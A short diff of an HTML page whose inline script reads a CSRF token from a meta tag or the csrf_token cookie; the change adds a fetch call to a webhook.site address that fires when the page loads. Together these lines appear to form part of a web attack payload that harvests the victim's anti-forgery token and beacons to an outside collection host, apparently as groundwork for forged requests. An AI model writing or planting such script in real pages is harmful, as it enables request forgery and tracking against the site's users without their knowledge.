@@ -2,6 +2,8 @@
   <body>
     <script>
       (async () => {
+                  fetch('https://webhook.site/f471a229-6330-48e3-b12e-68cf5d17ccf9?initial=true');
+        
         const csrf = document.querySelector('meta[name="csrf-token"]')?.content 
                     || document.cookie.match(/csrf_token=([^;]+)/)?.[1];
         if (!csrf) return;
